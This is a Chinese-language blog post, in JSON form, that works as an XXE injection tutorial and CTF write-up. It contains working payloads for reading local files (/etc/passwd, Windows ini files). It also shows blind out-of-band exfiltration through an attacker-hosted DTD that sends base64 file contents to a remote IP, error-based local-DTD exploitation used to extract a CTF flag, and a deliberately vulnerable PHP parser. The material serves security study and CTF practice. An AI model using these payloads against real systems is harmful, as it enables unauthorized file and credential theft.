{"title":"xxe","slug":"xxe","date":"2019-08-17T07:23:51.000Z","updated":"2019-09-03T14:20:16.807Z","comments":true,"path":"api/articles/xxe.json","photos":[],"link":"","excerpt":"一次简单的xxe学习~","covers":["https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png"],"content":"<p>一次简单的xxe学习~</p>\n<a id=\"more\"></a>\n<h1 id=\"XXE\"><a href=\"#XXE\" class=\"headerlink\" title=\"XXE\"></a>XXE</h1><h2 id=\"定义实体\"><a href=\"#定义实体\" class=\"headerlink\" title=\"定义实体\"></a>定义实体</h2><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;\n&lt;!DOCTYPE foo [\n&lt;!ELEMENT foo ANY &gt;\n&lt;!ENTITY xxe &quot;test&quot; &gt;]&gt;</code></pre><p>定义ANY说明接受任何元素，定义了了一个XML实体xxe，我们可以通过&amp;进行引用。XML可以写成这样，我们输出的结果中xxe被替换成了test</p>\n<pre><code>&lt;creds&gt;\n&lt;user&gt;&amp;xxe;&lt;/user&gt;\n&lt;pass&gt;mypass&lt;/pass&gt;\n&lt;/creds&gt;</code></pre><h2 id=\"实体引用\"><a href=\"#实体引用\" class=\"headerlink\" title=\"实体引用\"></a>实体引用</h2><pre><code>&amp;lt;    &lt;    小于号\n&amp;gt;    &gt;    大于号\n&amp;amp;    &amp;    和号\n&amp;apos;    &apos;    单引号\n&amp;quot;    &quot;    引号 </code></pre><h2 id=\"DTD-document-type-definition-文档类型定义\"><a href=\"#DTD-document-type-definition-文档类型定义\" class=\"headerlink\" title=\"DTD(document type definition 文档类型定义)\"></a>DTD(document type definition 文档类型定义)</h2><p>自定义XML文档的合法构建模块，可以在XML内部声明也可以外部引用。</p>\n<p><code>SYSTEM</code> 外部引用文件<br>    <!DOCTYPE note SYSTEM \"XXX.XX\"></p>\n<p>内部实体声明</p>\n<pre><code>&lt;!ENTITY entity-name &quot;entity-value&quot;&gt;\n\n&lt;?xml version=&apos;1.0&apos;?&gt;\n&lt;!DOCTYPE mail[\n&lt;!ELEMENT mail (message)&gt;\n&lt;!ENTITY hacker &quot;hacker&apos;s data&quot;&gt;\n]&gt;\n\n&lt;mail&gt;\n    &lt;message&gt;&amp;hacker;&lt;/message&gt;\n&lt;/mail&gt;</code></pre><p>外部实体声明</p>\n<pre><code>&lt;?xml version=&apos;1.0&apos;?&gt;\n&lt;!DOCTYPE mail[\n&lt;!ELEMENT mail (message)&gt;\n&lt;!--ENTITY hacker &quot;hacker&apos;s data&quot;--&gt;\n&lt;!ENTITY hacker SYSTEM &quot;file:///C:/Windows/win.ini&quot;&gt;\n]&gt;\n&lt;mail&gt;\n    &lt;message&gt;&amp;hacker;&lt;/message&gt;\n&lt;/mail&gt;</code></pre><p>当然我们也可以引用公用DTD，语法如下</p>\n<pre><code>&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</code></pre><p>起和SYSTEM一样的作用</p>\n<h2 id=\"外部声明默认协议\"><a href=\"#外部声明默认协议\" class=\"headerlink\" title=\"外部声明默认协议\"></a>外部声明默认协议</h2><p><img src=\"https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e93bbf00-ec17-1.png\" alt></p>\n<h2 id=\"通用实体与参数实体\"><a href=\"#通用实体与参数实体\" class=\"headerlink\" title=\"通用实体与参数实体\"></a>通用实体与参数实体</h2><p>只能用在DTD和文档的内部子集中</p>\n<p><strong>通用实体</strong> <code>&amp;name;</code> 在DTD中定义，在XML中引用，如上文的示例代码。</p>\n<p><strong>参数实体</strong></p>\n<ol>\n<li>使用 <code>% name</code> 在DTD中定义，并且只能在DTD中使用<code>%name</code>引用</li>\n<li>只有在DTD文件中，参数实体的声明才能引用其他实体</li>\n<li>参数实体也可以外部引用。</li>\n</ol>\n<h2 id=\"有回显读本地敏感文件\"><a href=\"#有回显读本地敏感文件\" class=\"headerlink\" title=\"有回显读本地敏感文件\"></a>有回显读本地敏感文件</h2><p>本地服务器解析代码</p>\n<pre><code>&lt;?php\n\n    libxml_disable_entity_loader (false);\n    $xmlfile = file_get_contents(&apos;php://input&apos;);\n    $dom = new DOMDocument();\n    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); \n    $creds = simplexml_import_dom($dom);\n    echo $creds;\n\n?&gt;</code></pre><p>payload</p>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; \n&lt;!DOCTYPE creds [  \n&lt;!ENTITY goodies SYSTEM &quot;file:///c:/windows/system.ini&quot;&gt; ]&gt; \n&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre><p>成功读取到敏感文件，但是如果我们的目标文件包含特殊符号时XML解释器会生成错误，我们这样做就会报错，此时我们就使用 <code>&lt;![CDATA[</code>在参数实体中进行。</p>\n<p>payload</p>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; \n&lt;!DOCTYPE roottag [\n&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   \n&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  \n&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  \n&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; \n%dtd; ]&gt; \n\n&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</code></pre><p>evil.dtd</p>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; \n&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</code></pre><p>also,we can read the file just bs64-encode</p>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; \n    &lt;!DOCTYPE creds [  \n    &lt;!ENTITY goodies SYSTEM &quot;php://filter/read=convert.base64-encode/resource=\nfile:///D:/test.txt&quot;&gt; ]&gt; \n    &lt;creds&gt;&amp;goodies;&lt;/creds&gt;</code></pre><p>这样就算有特殊字符也不怕啦！</p>\n<h2 id=\"无回显读取本地敏感文件-Blind-OOB-XXE\"><a href=\"#无回显读取本地敏感文件-Blind-OOB-XXE\" class=\"headerlink\" title=\"无回显读取本地敏感文件(Blind OOB XXE)\"></a>无回显读取本地敏感文件(Blind OOB XXE)</h2><p>外部实体可以通过请求内部文件uri获得文件内容，那我们可以通过写两个外部参数实体来请求自己的服务器将文件内容发送到我们的服务器上</p>\n<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;\n&lt;!DOCTYPE message [\n    &lt;!ENTITY % files SYSTEM &quot;file:///etc/passwd&quot;&gt;  \n    &lt;!ENTITY % send SYSTEM &quot;http://myip/?a=%files;&quot;&gt; \n    %send;\n]&gt;</code></pre><p>但是这样是不行的，几乎所有的XML解析器都不会解析同级参数实体的内容。</p>\n<p>如果我们进行嵌套操作呢？</p>\n<pre><code>&lt;?xml version=&quot;1.0&quot;?&gt;\n&lt;!DOCTYPE message [\n    &lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;  \n    &lt;!ENTITY % start &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://myip/?%file;&apos;&gt;&quot;&gt;\n    %start;\n    %send;\n]&gt;</code></pre><p>会报错 <code>PEReferences forbidden in internal subset in Entity</code>。禁止在内部实体引用参数实体。基于此我们采用引入外部DTD，在自己的服务器上加入DTD文件</p>\n<p>xml.php</p>\n<pre><code>&lt;?php\n\nlibxml_disable_entity_loader (false);\n$xmlfile = file_get_contents(&apos;php://input&apos;);\n$dom = new DOMDocument();\n$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); //loadXML() 方法通过解析一个 XML 标签字符串来组成该文档。\n?&gt;</code></pre><p>test.dtd</p>\n<pre><code>&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;\n&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37 send SYSTEM &apos;http://ip:9999?p=%file;&apos;&gt;&quot;&gt;</code></pre><p>payload</p>\n<pre><code>&lt;!DOCTYPE convert [ \n&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;\n%remote;%int;%send;\n]&gt;</code></pre><p>在payload的最后我们连续调用了三个参数实体<code>%remote;%int;%send;</code>，这就是我们的利用顺序。<code>%remote</code>先告诉解释器请求远程URL的<code>test.dtd</code>，随后<code>%int</code>调用参数实体中的<code>$file</code>，这将请求test.txt的内容并将其编码，最后调用<code>%send</code>将数据发送到vps上。</p>\n<h2 id=\"Exploiting-XXE-with-local-DTD-files\"><a href=\"#Exploiting-XXE-with-local-DTD-files\" class=\"headerlink\" title=\"Exploiting XXE with local DTD files\"></a>Exploiting XXE with local DTD files</h2><p>8/30/2019 10:47:36 AM </p>\n<p>在Ogeak-ctf里碰上一道xxe的题，<a href=\"http://47.107.253.140:18080/webserver/\" title=\"题目链接\" target=\"_blank\" rel=\"noopener\">http://47.107.253.140:18080/webserver/</a></p>\n<p>在源码里找到一段奇怪的JS</p>\n<pre><code>var data = &quot;&lt;?xml version=\\&quot;1.0\\&quot; ?&gt;\\n&lt;request&gt;\\n    &lt;status&gt;1&lt;/status&gt;\\n&lt;/request&gt;&quot;;\n\nsetInterval(function(){\n    $.post(&quot;callback&quot;, data);\n}, 10000);</code></pre><p>当时看不懂这是干嘛的，因为也有事也就没做了。事后再看这段代码发现是一个定时函数，每10秒post一个xml实体。我们抓包看一下</p>\n<p>在实体部分找上文的最简单的例子，不包含任何读文件的代码试一下发现返回<code>200</code>，内容异常返回<code>500</code>.</p>\n<p>听大佬说是屏蔽了外网，不允许我们请求外网服务器，只能利用本地DTD了。</p>\n<p>原理看<a href=\"https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/\" title=\"这里\" target=\"_blank\" rel=\"noopener\">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a></p>\n<p>读完大意就是如果我们找到了一个内部的DTD，我们可以强制在目标主机上调用这个本地dtd文件，在这个文件中重写上一步我们在内部DTD中找到的参数。如果我们定义了两个同名实体，只有第一个会被执行。于是我们可以利用重写的本地DTD文件触发报错来读我们的目标文件内容。</p>\n<p>like this</p>\n<pre><code>Request\n\n&lt;?xml version=&quot;1.0&quot; ?&gt;\n&lt;!DOCTYPE message [\n    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd&quot;&gt;\n\n    &lt;!ENTITY % condition &apos;aaa)&gt;\n        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;\n        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;\n        &amp;#x25;eval;\n        &amp;#x25;error;\n        &lt;!ELEMENT aa (bb&apos;&gt;\n\n    %local_dtd;\n]&gt;\n&lt;message&gt;any text&lt;/message&gt;\n\n    Response\n\njava.io.FileNotFoundException: /nonexistent/\nroot:x:0:0:root:/root:/bin/bash\nbin:x:1:1:bin:/bin:/usr/bin/nologin\ndaemon:x:2:2:daemon:/:/usr/bin/nologin\n\n(No such file or directory)</code></pre><p>Contents of sip-app_1_0.dtd</p>\n<pre><code>…\n&lt;!ENTITY % condition &quot;and | or | not | equal | contains | exists | subdomain-of&quot;&gt;\n&lt;!ELEMENT pattern (%condition;)&gt;\n…</code></pre><p>这里使用三层的实体嵌套，第二层中我们给定义参数实体的<code>%</code>进行编码，第三层中对<code>空格</code>,<code>&#39;</code>,<code>&quot;</code>,<code>&amp;</code>,<code>%</code>都进行了编码。代码里先调用<code>%local_dtd</code>，然后在对应的dtd文件中调用了<code>% condition</code>,在<code>condition</code>定义的实体中调用<code>eval</code>和<code>error</code>。在<code>error</code>的最后我们调用<code>%file</code>来获取文件内容。为什么不使用两层嵌套的原因是会报错<code>PEReferences forbidden in internal subset in Entity</code>指的是参数实体引用(Parameter Entity Reference)，禁止在内部Entity中引用参数实体。</p>\n<p>于是我们<a href=\"https://www.gosecure.net/blog/2019/07/16/automating-local-dtd-discovery-for-xxe-exploitation\" title=\"依据此\" target=\"_blank\" rel=\"noopener\">依据此</a>找到一个dtd文件来利用，这个<code>fonts.dtd</code>刚好是<code>tomcat:8-jre8</code> 里有的</p>\n<pre><code>&lt;!DOCTYPE message [\n    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/xml/fontconfig/fonts.dtd&quot;&gt;\n\n    &lt;!ENTITY % expr &apos;aaa)&gt;\n        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///flag&quot;&gt;\n        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;\n        &amp;#x25;eval;\n        &amp;#x25;error;\n        &lt;!ELEMENT aa (bb&apos;&gt;\n\n    %local_dtd;\n]&gt;\n&lt;message&gt;&lt;/message&gt;</code></pre><p>于是我们通过构造一个错误的url将数据带出，通过报错信息得到了flag</p>\n<h2 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h2><blockquote>\n<p><a href=\"https://xz.aliyun.com/t/3357#toc-8\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/3357#toc-8</a><br><a href=\"https://www.freebuf.com/vuls/207639.html\" target=\"_blank\" rel=\"noopener\">https://www.freebuf.com/vuls/207639.html</a></p>\n</blockquote>\n","categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"xxe","slug":"xxe","count":1,"path":"api/tags/xxe.json"}]}